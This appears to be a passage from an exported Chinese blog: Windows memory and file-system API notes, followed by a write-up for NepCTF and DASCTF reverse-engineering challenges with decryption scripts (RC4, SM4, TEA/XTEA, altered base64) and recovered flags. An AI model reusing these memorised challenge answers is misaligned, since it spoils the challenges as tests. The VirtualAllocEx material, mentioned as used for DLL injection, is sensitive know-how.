//创建一个文本框子窗口            CreateWindow(                &quot;EDIT&quot;,                &quot;&quot;,                WS_CHILD|WS_VISIBLE|ES_MULTILINE|WS_VSCROLL|WS_HSCROLL,                0,                0,                500,                360,                hwnd,                (HMENU)IDC_EDIT_1,                g_hInstance,                NULL);            //创建两个按钮的子窗口            CreateWindow(                &quot;BUTTON&quot;,                &quot;提示&quot;,                WS_CHILD|WS_VISIBLE,                510,                200,                40,                30,                hwnd,                (HMENU)IDC_BUTTON_1,                g_hInstance,                NULL);            CreateWindow(                &quot;BUTTON&quot;,                &quot;FLAG&quot;,                WS_CHILD|WS_VISIBLE,                510,                250,                40,                30,                hwnd,                (HMENU)IDC_BUTTON_2,                g_hInstance,                NULL);            break;        &#125;    &#125;    return  DefWindowProc (hwnd, uMsg, wParam, lParam) ;&#125;</code></pre><h3 id="虚拟内存与物理内存"><a href="#虚拟内存与物理内存" class="headerlink" title="虚拟内存与物理内存"></a>虚拟内存与物理内存</h3><p><a href="https://blog.csdn.net/lvyibin890/article/details/82217193">https://blog.csdn.net/lvyibin890/article/details/82217193</a></p><h3 id="私有内存的申请与释放"><a href="#私有内存的申请与释放" class="headerlink" title="私有内存的申请与释放"></a>私有内存的申请与释放</h3><p>之前我们用malloc申请的堆内存空间实际上是假申请，这些空间本来就已经申请好了的。而实际申请内存的方式有两种。</p><ol><li>通过VitualAlloc/通过VitualAllocEx申请的：Private Memory</li><li>通过CreateFileMapping映射的：Mapped Memory</li></ol><p>现在主要讲第一种，先来看看相关函数</p><p><strong>VirtualAlloc()</strong></p><p>该函数的功能是在调用进程的虚地址空间,预定或者提交一部分页。<br>简单点的意思就是申请内存空间</p><pre><code>LPVOID VirtualAlloc&#123;    LPVOID lpAddress, // 要分配的内存区域的地址    DWORD dwSize, // 分配的大小    DWORD flAllocationType, // 分配的类型    DWORD flProtect // 该内存的初始保护属性&#125;;</code></pre><p><strong>VirtualAllocEx()API</strong></p><p>在<strong>指定进程</strong>的虚拟空间保留或提交内存区域</p><pre><code>LPVOID VirtualAllocEx(    HANDLE hProcess,    LPVOID lpAddress,    SIZE_T dwSize,    DWORD flAllocationType,    DWORD flProtect);hProcess：申请内存所在的进程句柄。lpAddress：保留页面的内存地址；一般用NULL自动分配 。dwSize：欲分配的内存大小，字节单位；注意实际分 配的内存大小是页内存大小的整数倍flAllocationType可取下列值：MEM_COMMIT：为特定的页面区域分配内存中或磁盘的页面文件中的物理存储MEM_PHYSICAL ：分配物理内存（仅用于地址窗口扩展内存）MEM_RESERVE：保留进程的虚拟地址空间，而不分配任何物理存储。保留页面可通过继续调用VirtualAlloc（）而被占用MEM_RESET ：指明在内存中由参数lpAddress和dwSize指定的数据无效MEM_TOP_DOWN：在尽可能高的地址上分配内存（Windows 98忽略此标志）MEM_WRITE_WATCH：必须与MEM_RESERVE一起指定，使系统跟踪那些被写入分配区域的页面（仅针对Windows 98）flProtect可取下列值：PAGE_READONLY： 该区域为只读。如果应用程序试图访问区域中的页的时候，将会被拒绝访PAGE_READWRITE 区域可被应用程序读写PAGE_EXECUTE： 区域包含可被系统执行的代码。试图读写该区域的操作将被拒绝。PAGE_EXECUTE_READ ：区域包含可执行代码，应用程序可以读该区域。PAGE_EXECUTE_READWRITE： 区域包含可执行代码，应用程序可以读写该区域。PAGE_GUARD： 区域第一次被访问时进入一个STATUS_GUARD_PAGE异常，这个标志要和其他保护标志合并使用，表明区域被第一次访问的权限PAGE_NOACCESS： 任何访问该区域的操作将被拒绝PAGE_NOCACHE： RAM中的页映射到该区域时将不会被微处理器缓存（cached)注:PAGE_GUARD和PAGE_NOCHACHE标志可以和其他标志合并使用以进一步指定页的特征。PAGE_GUARD标志指定了一个防护页（guard page），即当一个页被提交时会因第一次被访问而产生一个one-shot异常，接着取得指定的访问权限。PAGE_NOCACHE防止当它映射到虚拟页的时候被微处理器缓存。这个标志方便设备驱动使用直接内存访问方式（DMA）来共享内存块。返回值：执行成功就返回分配内存的首地址，不成功就是NULL。</code></pre><p>例子可以参考DLL注入文章。</p><p><strong>VirtualFree()</strong><br>VirtualFree该函数的功能是取消或者释放调用进程的虚地址空间页的一个区域。</p><pre><code>BOOL VirtualFree(    LPVOID lpAddress, // 区域地址    SIZE_T dwSize，// 区域大小，字节    DWORD dwFreeType // 类型);</code></pre><p><strong>VirtualFreeEx()</strong></p><p>VirtualFreeEx即为目标进程的句柄，可在其它进程中释放申请的虚拟内存空间。</p><pre><code>BOOL VirtualFreeEx&#123;HANDLE hProcess, // 要释放内存所在进程的句柄LPVOID lpAddress, // 区域地址DWORD dwSize, // 区域大小，字节DWORD dwFreeType //类型&#125;;如果 dwFreeType 为 MEM_RELEASE，则 dwSize 必须为0 . 按 VirtualAllocEx申请时的大小全部释放。如果dwFreeType 为 MEM_DECOMMIT, 则释放从lpAddress 开始的一个或多个字节 ，即 lpAddress +dwSize。</code></pre><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>文件系统是操作系统用于明确存储设备（常见的是磁盘，也有基于NAND Flash的固态硬盘）或分区上的文件的方法和数据结构；即在存储设备上组织文件的方法。</p><h4 id="卷相关API："><a href="#卷相关API：" class="headerlink" title="卷相关API："></a>卷相关API：</h4><p><strong>GetLogicalDrives()</strong></p><p>作用为判断系统中存在哪些逻辑驱动器字母。</p><pre><code>DWORD GetLogicalDrives(void);</code></pre><p>一般情况下DWORD的数据长度是32位，在这个DWORD中，每一位对应了一个逻辑驱动器是否存在。第二位如果是“1”则表示驱动器“B:”存在，第四位如果是“1”则表示驱动器“D:”存在，以此类推。例如44，换为二进制00101100，就代表有C,D,F盘。<br><strong>GetLogicalDriveStrings()</strong></p><p>GetLogicalDriveStrings，获取一个字串，其中包含了当前所有逻辑驱动器的根驱动器路径。</p><pre><code>DWORD GetLogicalDriveStrings(    DWORD nBufferLength, // size of buffer    LPTSTR lpBuffer // drive strings buffer);就是盘的字符串会存到lpBuffer里面，C:\ D:\ F:\</code></pre><p><strong>GetDriveType()</strong></p><p>GetDriveType是程序中的一种函数类型，这个GetDriveType函数是用来确定磁盘驱动器是可移动的、固定的、CD-ROM、RAM磁盘还是网络驱动器。</p><pre><code>UINT GetDriveType(    LPCTSTR lpRootPathName //根目录路径的字符串指针);返回值,宏，是数字，对应下面的类型DRIVE_UNKNOWN 未知的磁盘类型DRIVE_NO_ROOT_DIR 说明lpRootPathName是无效的DRIVE_REMOVABLE 可移动磁盘DRIVE_FIXED 固定磁盘DRIVE_REMOTE 网络磁盘DRIVE_CDROM 光驱DRIVE_RAMDISK 为RAM</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nepctf&amp;dasctf的wp</title>
      <link href="2021/03/27/nepctf&amp;dasctf/"/>
      <url>2021/03/27/nepctf&amp;dasctf/</url>
      
        <content type="html"><![CDATA[<p>前言：最近打了这两个比赛，赛后就把一些题复现了一下，还是学到很多吧。</p><h1 id="nepctf"><a href="#nepctf" class="headerlink" title="nepctf"></a>nepctf</h1><h2 id="hardcsharp"><a href="#hardcsharp" class="headerlink" title="hardcsharp"></a>hardcsharp</h2><p>文件是用C#写的，用<br>aes解密，网上解密即可dnSpy打开<br><img src="https://i.loli.net/2021/03/24/buJOWFfDYeSXnVH.png"></p><p>先获得key</p><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;//badbadwomen!!!!!!!!!!!!!!!!!!!!!int main()&#123;    int a[32]=&#123;81,82,87,81,82,87,68,92,94,86,93,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18&#125;;    int i;    for(i=0;i&lt;32;i++)    &#123;        printf(&quot;%x&quot;,a[i]^51);    &#125;&#125;//key=626164626164776f6d656e212121212121212121212121212121212121212121</code></pre><p>然后网上解密就行了<br><img src="https://i.loli.net/2021/03/24/SOVGDMvNX5Yx8rh.png"></p><h2 id="easy-mips"><a href="#easy-mips" class="headerlink" title="easy_mips"></a>easy_mips</h2><p>反编译出来，找到加密在这个函数里面，并且对第1,6,7进行了随机数。<br><img src="https://i.loli.net/2021/03/24/LN9rRtlUQBiX1es.png"><br>根据题目提示，改一下一些字符就行了</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    char a[]=&quot;3_isjA0UeQZcNa\\`\\Vf&quot;;    int i, m=5;    for(i=0;i&lt;19;i++)    &#123;        a[i]=a[i]+(m++);    &#125;    a[0]=&#39;N&#39;;    a[5]=&#39;o&#39;;    a[6]=&#39;l&#39;;    printf(&quot;%s&quot;,a);&#125;//Nep&#123;solar_is_sotql&#125;</code></pre><h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><p>一道APK题目，魔改rc4加密，然后key是一个变表的base64加密，在so文件里面。</p><p>先来看key<br><img src="https://i.loli.net/2021/03/24/oAd2c9VSwlR3Tna.png"><br>python解出key</p><pre><code>import base64import stringstr1 = &quot;73g6L2PWL2PXFmR+7ise7iq==&quot;string1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))//th1s_1s_k3y!!!!!</code></pre><p>在来看apk文件，jeb打开，加密过程在Encrypt<br><img src="https://i.loli.net/2021/03/24/ROf3AVm29YrnByx.png"></p><p>rc4解密</p><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include &lt;wchar.h&gt;typedef unsigned longULONG;/*初始化函数*/void rc4_init(unsigned char*s, unsigned char*key, unsigned long Len)&#123;    int i = 0, j = 0;    char k[256] = &#123; 0 &#125;;    unsigned char tmp = 0;    for (i = 0; i&lt;256; i++)    &#123;        s[i] = 256-i;        k[i] = key[i%Len];    &#125;    for (i = 0; i&lt;256; i++)    &#123;        j = (j + s[i] + k[i]) % 256;        tmp = s[i];        s[i] = s[j];//交换s[i]和s[j]        s[j] = tmp;    &#125;&#125;/*加解密*/void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len)&#123;    int i = 0, j = 0, t = 0;    unsigned long k = 0;    unsigned char tmp;    for (k = 0; k&lt;Len; k++)    &#123;        i = (i + 1) % 256;        j = (j + s[i]) % 256;        tmp = s[i];        s[i] = s[j];//交换s[x]和s[y]        s[j] = tmp;        t = (s[i] + s[j]) % 256;        Data[k] ^= s[t];    &#125;&#125;int main()&#123;    unsigned char s[256] = &#123; 0 &#125;, s2[256] = &#123; 0 &#125;;//S-box    char key[256] =&quot;th1s_1s_k3y!!!!!&quot;;    char pData[256] = &#123; &#39;\x8b&#39;,&#39;\xd2&#39;,&#39;\xd9&#39;,&#39;\x5d&#39;,&#39;\x95&#39;,&#39;\xff&#39;,&#39;\x7e&#39;,&#39;\x5f&#39;,&#39;\x29&#39;,&#39;\x56&#39;,&#39;\x12&#39;,&#39;\xb9&#39;,&#39;\xef&#39;,&#39;\xec&#39;,&#39;\x8b&#39;,&#39;\xd0&#39;,&#39;\x45&#39;&#125;;       //char pData[256]=&quot;\x8b\xd2\xd9\x5d\x95\xff\x7e\x5f\x29\x56\x12\xb9\xef\xec\x8b\xd0\x45&quot;;    unsigned long len = strlen(pData);    int i;    printf(&quot;pData=%s\n&quot;, pData);    printf(&quot;key=%s,length=%d\n\n&quot;, key, strlen(key));    rc4_init(s, (unsigned char*)key, strlen(key));//已经完成了初始化    printf(&quot;\n&quot;);    for (i = 0; i&lt;256; i++)//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！    &#123;        s2[i] = s[i];    &#125;    rc4_crypt(s2, (unsigned char*)pData, len);//解密    printf(&quot;pData=%s\n\n&quot;, pData);    for(i=0;i&lt;20;i++)    &#123;        printf(&quot;%d &quot;,pData[i]);    &#125;    return 0;&#125;//Y0uG3tTheP4ssw0rd</code></pre><p>然后用这个去解压缩包，得到Nep{4c89261f-4d09-4bbf-be6c-9303128a143c}</p><h2 id="二十六进制"><a href="#二十六进制" class="headerlink" title="二十六进制"></a>二十六进制</h2><p>这道题应该做起了的，可能因为自己手动算时打错数了，最后得到的数错了。<br><img src="https://i.loli.net/2021/03/24/udNra6qRfUKclpB.png"></p><p>先得到26进制的数</p><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;//2163qwe)(*&amp;^%489$!057@#&gt;&lt;A//25 6 18 19 15 17 1int main()&#123;    int table[26]=&#123;&#39;2&#39;, &#39;1&#39;, &#39;6&#39;, &#39;3&#39;, &#39;q&#39;, &#39;w&#39;, &#39;e&#39;, &#39;)&#39;, &#39;(&#39;, &#39;*&#39;, &#39;&amp;&#39;, &#39;^&#39;, &#39;%&#39;, &#39;4&#39;, &#39;8&#39;, &#39;9&#39;, &#39;$&#39;, &#39;!&#39;, &#39;0&#39;, &#39;5&#39;, &#39;7&#39;, &#39;@&#39;, &#39;#&#39;, &#39;&gt;&#39;, &#39;&lt;&#39;, &#39;A&#39;&#125;;    int a[7]=&#123;&#39;F&#39;, &#39;b&#39;, &#39;7&#39;, &#39;2&#39;, &#39;&gt;&#39;, &#39;&amp;&#39;, &#39;6&#39;&#125;;    int i,j;    for(i=0;i&lt;7;i++)    &#123;        a[i]=a[i]^7;        printf(&quot;%c,&quot;,a[i]);    &#125;    printf(&quot;\n&quot;);    for(i=0;i&lt;7;i++)    &#123;        for(j=0;j&lt;=32;j++)        &#123;            if(a[i]==table[j])            &#123;                printf(&quot;%d &quot;,j);                break;            &#125;        &#125;    &#125;&#125; </code></pre><p>由于是正向存入的数，所以转10进制时要倒着来。</p><p>python脚本</p><pre><code>l=[1,17,15,19,18,6,25]num=0for i in l:    if(i==25):        num=num+i        break;    num=(num+i)*26print(num)//518100101</code></pre><p>然后md5加密得到Nep{967fa25cbea166ded43127f141cff31a}</p><h2 id="worrrrms"><a href="#worrrrms" class="headerlink" title="worrrrms"></a>worrrrms</h2><p>文件应该是go语言写的，但是不用脚本也可以看，sm4的ECB模式加密加密，wp说动调可以调出来，能力有限，试了很多次，每次都调飞了，然后根据解题的一些数据来找到相关位置吧。</p><p>分析一下<br><img src="https://i.loli.net/2021/03/27/WDoeiAFwKt3PJrh.png"><br>进入sm4加密函数看看<br><img src="https://i.loli.net/2021/03/27/XNqVfaQsgbxDF49.png"><br>key是base64解密后的，然后转16进制</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int code[20]=&#123;2, 23, 137, 200, 217, 218, 251, 229, 14, 71, 140, 137, 76, 29,122, 185&#125;;    char key[17]=&quot;icantelluasimple&quot;;    int i;    printf(&quot;key=&quot;);    for(i=0;i&lt;16;i++)    &#123;        printf(&quot;%02x&quot;,key[i]);    &#125;    printf(&quot;\ncode=&quot;);    for(i=0;i&lt;16;i++)    &#123;        printf(&quot;%02x&quot;,code[i]);    &#125;    //key=6963616e74656c6c756173696d706c65    //code=021789c8d9dafbe50e478c894c1d7ab9 &#125; </code></pre><p>网上python脚本如下</p><pre><code>SBOX = [&#39;d6&#39;, &#39;90&#39;, &#39;e9&#39;, &#39;fe&#39;, &#39;cc&#39;, &#39;e1&#39;, &#39;3d&#39;, &#39;b7&#39;, &#39;16&#39;, &#39;b6&#39;, &#39;14&#39;, &#39;c2&#39;, &#39;28&#39;, &#39;fb&#39;, &#39;2c&#39;, &#39;05&#39;,       &#39;2b&#39;, &#39;67&#39;, &#39;9a&#39;, &#39;76&#39;, &#39;2a&#39;, &#39;be&#39;, &#39;04&#39;, &#39;c3&#39;, &#39;aa&#39;, &#39;44&#39;, &#39;13&#39;, &#39;26&#39;, &#39;49&#39;, &#39;86&#39;, &#39;06&#39;, &#39;99&#39;,       &#39;9c&#39;, &#39;42&#39;, &#39;50&#39;, &#39;f4&#39;, &#39;91&#39;, &#39;ef&#39;, &#39;98&#39;, &#39;7a&#39;, &#39;33&#39;, &#39;54&#39;, &#39;0b&#39;, &#39;43&#39;, &#39;ed&#39;, &#39;cf&#39;, &#39;ac&#39;, &#39;62&#39;,       &#39;e4&#39;, &#39;b3&#39;, &#39;1c&#39;, &#39;a9&#39;, &#39;c9&#39;, &#39;08&#39;, &#39;e8&#39;, &#39;95&#39;, &#39;80&#39;, &#39;df&#39;, &#39;94&#39;, &#39;fa&#39;, &#39;75&#39;, &#39;8f&#39;, &#39;3f&#39;, &#39;a6&#39;,       &#39;47&#39;, &#39;07&#39;, &#39;a7&#39;, &#39;fc&#39;, &#39;f3&#39;, &#39;73&#39;, &#39;17&#39;, &#39;ba&#39;, &#39;83&#39;, &#39;59&#39;, &#39;3c&#39;, &#39;19&#39;, &#39;e6&#39;, &#39;85&#39;, &#39;4f&#39;, &#39;a8&#39;,       &#39;68&#39;, &#39;6b&#39;, &#39;81&#39;, &#39;b2&#39;, &#39;71&#39;, &#39;64&#39;, &#39;da&#39;, &#39;8b&#39;, &#39;f8&#39;, &#39;eb&#39;, &#39;0f&#39;, &#39;4b&#39;, &#39;70&#39;, &#39;56&#39;, &#39;9d&#39;, &#39;35&#39;,       &#39;1e&#39;, &#39;24&#39;, &#39;0e&#39;, &#39;5e&#39;, &#39;63&#39;, &#39;58&#39;, &#39;d1&#39;, &#39;a2&#39;, &#39;25&#39;, &#39;22&#39;, &#39;7c&#39;, &#39;3b&#39;, &#39;01&#39;, &#39;21&#39;, &#39;78&#39;, &#39;87&#39;,       &#39;d4&#39;, &#39;00&#39;, &#39;46&#39;, &#39;57&#39;, &#39;9f&#39;, &#39;d3&#39;, &#39;27&#39;, &#39;52&#39;, &#39;4c&#39;, &#39;36&#39;, &#39;02&#39;, &#39;e7&#39;, &#39;a0&#39;, &#39;c4&#39;, &#39;c8&#39;, &#39;9e&#39;,       &#39;ea&#39;, &#39;bf&#39;, &#39;8a&#39;, &#39;d2&#39;, &#39;40&#39;, &#39;c7&#39;, &#39;38&#39;, &#39;b5&#39;, &#39;a3&#39;, &#39;f7&#39;, &#39;f2&#39;, &#39;ce&#39;, &#39;f9&#39;, &#39;61&#39;, &#39;15&#39;, &#39;a1&#39;,       &#39;e0&#39;, &#39;ae&#39;, &#39;5d&#39;, &#39;a4&#39;, &#39;9b&#39;, &#39;34&#39;, &#39;1a&#39;, &#39;55&#39;, &#39;ad&#39;, &#39;93&#39;, &#39;32&#39;, &#39;30&#39;, &#39;f5&#39;, &#39;8c&#39;, &#39;b1&#39;, &#39;e3&#39;,       &#39;1d&#39;, &#39;f6&#39;, &#39;e2&#39;, &#39;2e&#39;, &#39;82&#39;, &#39;66&#39;, &#39;ca&#39;, &#39;60&#39;, &#39;c0&#39;, &#39;29&#39;, &#39;23&#39;, &#39;ab&#39;, &#39;0d&#39;, &#39;53&#39;, &#39;4e&#39;, &#39;6f&#39;,       &#39;d5&#39;, &#39;db&#39;, &#39;37&#39;, &#39;45&#39;, &#39;de&#39;, &#39;fd&#39;, &#39;8e&#39;, &#39;2f&#39;, &#39;03&#39;, &#39;ff&#39;, &#39;6a&#39;, &#39;72&#39;, &#39;6d&#39;, &#39;6c&#39;, &#39;5b&#39;, &#39;51&#39;,       &#39;8d&#39;, &#39;1b&#39;, &#39;af&#39;, &#39;92&#39;, &#39;bb&#39;, &#39;dd&#39;, &#39;bc&#39;, &#39;7f&#39;, &#39;11&#39;, &#39;d9&#39;, &#39;5c&#39;, &#39;41&#39;, &#39;1f&#39;, &#39;10&#39;, &#39;5a&#39;, &#39;d8&#39;,       &#39;0a&#39;, &#39;c1&#39;, &#39;31&#39;, &#39;88&#39;, &#39;a5&#39;, &#39;cd&#39;, &#39;7b&#39;, &#39;bd&#39;, &#39;2d&#39;, &#39;74&#39;, &#39;d0&#39;, &#39;12&#39;, &#39;b8&#39;, &#39;e5&#39;, &#39;b4&#39;, &#39;b0&#39;,       &#39;89&#39;, &#39;69&#39;, &#39;97&#39;, &#39;4a&#39;, &#39;0c&#39;, &#39;96&#39;, &#39;77&#39;, &#39;7e&#39;, &#39;65&#39;, &#39;b9&#39;, &#39;f1&#39;, &#39;09&#39;, &#39;c5&#39;, &#39;6e&#39;, &#39;c6&#39;, &#39;84&#39;,       &#39;18&#39;, &#39;f0&#39;, &#39;7d&#39;, &#39;ec&#39;, &#39;3a&#39;, &#39;dc&#39;, &#39;4d&#39;, &#39;20&#39;, &#39;79&#39;, &#39;ee&#39;, &#39;5f&#39;, &#39;3e&#39;, &#39;d7&#39;, &#39;cb&#39;, &#39;39&#39;, &#39;48&#39;,]FK = [&#39;a3b1bac6&#39;, &#39;56aa3350&#39;, &#39;677d9197&#39;, &#39;b27022dc&#39;]CK = [&#39;00070e15&#39;, &#39;1c232a31&#39;, &#39;383f464d&#39;, &#39;545b6269&#39;,      &#39;70777e85&#39;, &#39;8c939aa1&#39;, &#39;a8afb6bd&#39;, &#39;c4cbd2d9&#39;,      &#39;e0e7eef5&#39;, &#39;fc030a11&#39;, &#39;181f262d&#39;, &#39;343b4249&#39;,      &#39;50575e65&#39;, &#39;6c737a81&#39;, &#39;888f969d&#39;, &#39;a4abb2b9&#39;,      &#39;c0c7ced5&#39;, &#39;dce3eaf1&#39;, &#39;f8ff060d&#39;, &#39;141b2229&#39;,      &#39;30373e45&#39;, &#39;4c535a61&#39;, &#39;686f767d&#39;, &#39;848b9299&#39;,      &#39;a0a7aeb5&#39;, &#39;bcc3cad1&#39;, &#39;d8dfe6ed&#39;, &#39;f4fb0209&#39;,      &#39;10171e25&#39;, &#39;2c333a41&#39;, &#39;484f565d&#39;, &#39;646b7279&#39;]def left(list,n):    return list[n:] + list[:n]def group(list, n):    for i in range(0, len(list), n):        yield list[i:i + n]def xor(a,b):    a1 = int(a,16)    b1 = int(b,16)    if a == b:        A = &#39;&#123;:032x&#125;&#39;.format(int(a1^b1))    else:        A = &#39;&#123;:08x&#125;&#39;.format(int(a1^b1))    return Adef round_function(k0,k1,k2,k3,rk,mod):    k = xor(xor(xor(k1,k2),k3),rk)    Tr = T(k,mod)    rki = xor(k0,Tr)    return rkidef T(A,mod):    T = linear(S(A),mod)    return Tdef S(A):    A1 = []    A2 = [0,0,0,0]    for i in group(A,2):        A1.append(i)    for i in range(4):        l = int(A1[i],16)        A2[i] = &#39;&#123;:02x&#125;&#39;.format(int(SBOX[l],16))    A2 = &#39;&#39;.join(A2)    return A2def linear(B,mod):    B1 = list(B)    for i in range(8):        B1[i] = &#39;&#123;:04b&#125;&#39;.format(int(B1[i],16))    B1 = &#39;&#39;.join(B1)    B1_2= left(B1,2)    B1_10 = left(B1,10)    B1_18 = left(B1,18)    B1_24 = left(B1,24)    B1_13 = left(B1,13)    B1_23 = left(B1,23)    if mod == &#39;enc&#39; or mod ==  &#39;dec&#39;:        BX = xor(xor(xor(xor(B1,B1_2),B1_10),B1_18),B1_24)    elif mod == &#39;extend&#39;:        BX = xor(xor(B1,B1_13),B1_23)    else:        return &quot;模式输入错误&quot;    BX = &#39;%x&#39;%int(BX, 2)    return BXdef get_key(key):    MK = []    for i in group(key,8):        MK.append(i)    key0 = xor(MK[0],FK[0])    key1 = xor(MK[1],FK[1])    key2 = xor(MK[2],FK[2])    key3 = xor(MK[3],FK[3])    keylist = [key0,key1,key2,key3]    rk = []    for i in range(32):        a = round_function(keylist[i],keylist[i+1],keylist[i+2],keylist[i+3],CK[i],mod=&#39;extend&#39;)        keylist.append(a)        rk.append(a)    return rkdef get_sm4_ecb(key,input_data,mod):    data = []    rk = get_key(key)    for i in group(input_data,8):        data.append(i)    for i in range(32):        if mod == &#39;enc&#39;:            ldata = round_function(data[i],data[i+1],data[i+2],data[i+3],rk[i],mod)        else:            ldata = round_function(data[i],data[i+1],data[i+2],data[i+3],rk[31-i],mod)        data.append(ldata)    out_data = [data[35],data[34],data[33],data[32]]    out_data = &#39;&#39;.join(out_data)    return out_datas=&#39;&#39;s=get_sm4_ecb(key = &#39;6963616e74656c6c756173696d706c65&#39;, input_data = &#39;021789c8d9dafbe50e478c894c1d7ab9&#39;, mod = &#39;dec&#39;)y = bytearray.fromhex(s)print(y)//we1come_2_nepCTF</code></pre><p>得到Nep{we1come_2_nepCTF}</p><h1 id="dasctf"><a href="#dasctf" class="headerlink" title="dasctf"></a>dasctf</h1><h2 id="drinkSomeTea"><a href="#drinkSomeTea" class="headerlink" title="drinkSomeTea"></a>drinkSomeTea</h2><p>这道题吃了不会文件知识的亏吧，太菜的我居然用提数据来做，真是sb,而且数据处理还有一些地方存在问题，导致自己用解密后的数据生成的png文件不对。</p><p>先说一说考点吧，思路还是很简单，要先去花指令才能看到tea加密，然后这个tea加密是int的，大概过程就是将一个png文件两个int，两个int的加密。</p><p>先去花。<br><img src="https://i.loli.net/2021/03/29/qUN74h6ZQs1bG2g.png"><br>再来看主要过程<br><img src="https://i.loli.net/2021/03/29/MVef6rgFJAdc4lk.png"></p><p>然后写脚本就ok了</p><pre><code>#include &lt;stdio.h&gt;void decrypt (int* v, int* k) &#123;    int v0=v[0], v1=v[1], sum=0xC6EF3720, i;     int delta=0x9e3779b9;                         int k0=k[0], k1=k[1], k2=k[2], k3=k[3];       for (i=0; i&lt;32; i++)     &#123;                             v1 -= ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);        v0 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);        sum -= delta;    &#125;                                              v[0]=v0; v[1]=v1;&#125;int main()&#123;    int v[14656]=&#123;0&#125;,k[4]=&#123;0x67616C66, 0x6B61667B, 0x6C665F65, 0x7D216761&#125;;    FILE *p1 = fopen(&quot;./tea.png.out&quot;, &quot;rb&quot;);    fread(&amp;v, 4, 14656, p1);    fclose(p1);    for(int i=0;i&lt;14656;i+=2)    &#123;        decrypt(&amp;v[i], k);    &#125;    FILE *p2 = fopen(&quot;./tea.png&quot;, &quot;wb&quot;);    fwrite(&amp;v, 4, 14656, p2);    fclose(p2);    return 0;&#125;</code></pre><p>这里就写一些关于文件读写的函数吧。</p><p><strong>fopen</strong></p><p>fopen函数是打开一个文件，FILE *FP的这个fp是一个流</p><pre><code>FILE *fp；fp=fopen(&quot;file a&quot;,&quot;r&quot;);其意义是在当前目录下打开文件file a，只允许进行“读”操作，并使fp指向该文件。FILE *fphzkfphzk=fopen(&quot;c:\\hzk16&quot;,&quot;rb&quot;);其意义是打开C驱动器磁盘的根目录下的文件hzk16，按二进制方式进行读操作。两个反斜线“\\ ”中的第一个表示转义字符，第二个表示根目录。</code></pre><p><strong>fclose</strong></p><p>fopen函数是关闭一个流</p><pre><code>fclose是一个函数名，功能是关闭一个流。注意：使用fclose()函数就可以把缓冲区内最后剩余的数据输出到内核缓冲区，并释放文件指针和有关的缓冲区。函数原型：int fclose( FILE *fp );返回值：如果流成功关闭，fclose 返回 0，否则返回EOF（-1）。（如果流为NULL，而且程序可以继续执行，fclose设定error number给EINVAL，并返回EOF。）</code></pre><p><strong>fwrite</strong></p><p>从给定输入流stream读取最多count个对象到数组buffer中（相当于对每个对象调用size次fgetc），把buffer当作unsigned char数组并顺序保存结果。</p><pre><code> fread( void *buffer,       //    指向要读取的数组中首个对象的指针     size_t size,           //每个对象的大小（单位是字节）     size_t count,          //    要读取的对象个数     FILE *stream           //输入流 )</code></pre><p><strong>fwrite</strong></p><p>fwrite() 是 C 语言标准库中的一个文件处理函数，功能是向指定的文件中写入若干数据块，如成功执行则返回实际写入的数据块数目。该函数以二进制形式对文件进行操作，不局限于文本文件。</p><pre><code>size_t fwrite(        const void *ptr, //     是一个指针，对fwrite来说，是要获取数据的地址；        size_t size,   //     要写入内容的单字节数；        size_t nmemb,   //    要进行写入size字节的数据项的个数；        FILE *stream  //      目标文件指针，流)</code></pre><h2 id="Enjoyit-1"><a href="#Enjoyit-1" class="headerlink" title="Enjoyit-1"></a>Enjoyit-1</h2><p>考点就是变表的base64，和改了delta的xtea算法吧。</p><p>变表base64<br><img src="https://i.loli.net/2021/03/29/ByrObIoFhUEcf1C.png"><br>c函数<br><img src="https://i.loli.net/2021/03/29/NEvHzlhqodYFIj5.png"><br>python脚本</p><pre><code>import base64import stringstr1 = &#39;yQXHyBvN3g/81gv51QXG1QTBxRr/yvXK1hC=&#39;string1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print(base64.b64decode(str1.translate(str.maketrans(string1, string2))))//b&#39;combustible_oolong_tea_plz&#39;</code></pre><p>得到flag要27h，显然不可能等，继续看后面过程<br><img src="https://i.loli.net/2021/03/29/jQY6asWAhlOkSwD.png"><br>先得到xtea加密后的array</p><pre><code>#include &lt;stdio.h&gt;void encipher(unsigned int num_rounds, unsigned int v[2], unsigned int key[4]) &#123;    unsigned int i;    unsigned int v0=v[0], v1=v[1], sum=0, delta=2654435464U;    for (i=0; i &lt; num_rounds; i++) &#123;        v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);        sum += delta;        v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);    &#125;    v[ 0]=v0; v[1]=v1;&#125;int main()&#123;    unsigned int v[2]=&#123;288,369&#125;;    unsigned int k[4]=&#123;0x63,0x6f,0x6d,0x62&#125;;    unsigned int r=32;    encipher(r, v, k);    printf(&quot;加密后的数据：%x %x\n&quot;,v[0],v[1]);    return 0;&#125;//6308fe34b7fe6fdb</code></pre><p>再进行异或<br>    #include &lt;stdio.h&gt;</p><pre><code>int main(void)&#123;    int 